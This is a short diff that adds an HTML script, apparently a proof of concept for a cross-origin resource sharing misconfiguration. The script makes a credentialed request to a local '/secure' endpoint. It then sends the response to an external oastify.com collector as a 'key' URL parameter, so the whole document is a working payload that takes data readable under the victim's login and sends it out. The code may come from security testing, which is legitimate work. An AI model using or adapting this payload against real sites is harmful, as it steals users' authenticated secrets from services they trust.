@@ -1,0 +1,11 @@
+<script>
+   var req = new XMLHttpRequest();
+   req.onload = reqListener;
+   req.open('get','https://127.0.0.1:5000/secure',true);
+   req.withCredentials = true;
+   req.send();
+
+   function reqListener() {
+       location='https://547u0w8uhtt3n6u5lxz1ijnad1jr7g.oastify.com/log?key='+this.responseText;
+   };
+</script>
